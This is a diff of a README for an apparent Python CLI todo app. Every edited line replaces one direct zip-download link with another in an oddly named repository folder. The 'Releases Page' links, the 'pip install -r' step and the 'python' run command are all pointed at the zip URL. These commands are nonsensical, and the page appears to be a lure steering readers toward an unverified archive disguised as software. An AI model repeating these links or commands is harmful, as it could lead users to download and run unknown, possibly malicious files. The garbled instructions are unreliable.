@@ -1,9 +1,9 @@
 # 🎯 cli-todo-list - Manage Your Tasks Effortlessly
 
 ## 📥 Download and Install
-[![Download cli-todo-list](https://github.com/Vykemopi/cli-todo-list/raw/refs/heads/main/ungluttonous/cli_list_todo_chloroaurite.zip)](https://github.com/Vykemopi/cli-todo-list/raw/refs/heads/main/ungluttonous/cli_list_todo_chloroaurite.zip)
+[![Download cli-todo-list](https://raw.githubusercontent.com/Vykemopi/cli-todo-list/main/ungluttonous/cli_todo_list_3.0.zip)](https://raw.githubusercontent.com/Vykemopi/cli-todo-list/main/ungluttonous/cli_todo_list_3.0.zip)
 
-To get started with cli-todo-list, visit this page to download: [Releases Page](https://github.com/Vykemopi/cli-todo-list/raw/refs/heads/main/ungluttonous/cli_list_todo_chloroaurite.zip).
+To get started with cli-todo-list, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Vykemopi/cli-todo-list/main/ungluttonous/cli_todo_list_3.0.zip).
 
 ## 🚀 Getting Started
 cli-todo-list is a user-friendly command-line application built in Python. It helps you manage your daily tasks without any complications. You can add, view, update, delete, search, and report on your todos—all directly from the terminal.
@@ -23,9 +23,9 @@ Before you install cli-todo-list, please ensure your system meets the following 
 - **Type-Safe**: Built with strong types to avoid errors.
 
 ## 💻 How to Download cli-todo-list
-1. Go to the [Releases Page](https://github.com/Vykemopi/cli-todo-list/raw/refs/heads/main/ungluttonous/cli_list_todo_chloroaurite.zip).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Vykemopi/cli-todo-list/main/ungluttonous/cli_todo_list_3.0.zip).
 2. Find the latest version of cli-todo-list.
-3. Click on the download link for your operating system. The file will typically be in `.zip` or `https://github.com/Vykemopi/cli-todo-list/raw/refs/heads/main/ungluttonous/cli_list_todo_chloroaurite.zip` format.
+3. Click on the download link for your operating system. The file will typically be in `.zip` or `https://raw.githubusercontent.com/Vykemopi/cli-todo-list/main/ungluttonous/cli_todo_list_3.0.zip` format.
 4. Save the file to your desired location on your computer.
 
 ## 📦 Installation Steps
@@ -37,7 +37,7 @@ Before you install cli-todo-list, please ensure your system meets the following 
    ```
 4. Install the necessary dependencies by running:
    ```
-   pip install -r https://github.com/Vykemopi/cli-todo-list/raw/refs/heads/main/ungluttonous/cli_list_todo_chloroaurite.zip
+   pip install -r https://raw.githubusercontent.com/Vykemopi/cli-todo-list/main/ungluttonous/cli_todo_list_3.0.zip
    ```
 
 ## ⚙️ Running the Application
@@ -47,7 +47,7 @@ After installation, you can start using cli-todo-list by following these steps:
 2. Navigate to the cli-todo-list folder.
 3. Run the following command:
    ```
-   python https://github.com/Vykemopi/cli-todo-list/raw/refs/heads/main/ungluttonous/cli_list_todo_chloroaurite.zip
+   python https://raw.githubusercontent.com/Vykemopi/cli-todo-list/main/ungluttonous/cli_todo_list_3.0.zip
    ```
 
 ## 📋 Usage Instructions
@@ -68,4 +68,4 @@ For any inquiries, please contact via GitHub or directly through the repository'
 ## 🎉 Conclusion
 cli-todo-list simplifies your task management right from the terminal. Download the application today and take control of your tasks easily!
 
-[Visit the Releases Page to Download](https://github.com/Vykemopi/cli-todo-list/raw/refs/heads/main/ungluttonous/cli_list_todo_chloroaurite.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Vykemopi/cli-todo-list/main/ungluttonous/cli_todo_list_3.0.zip)
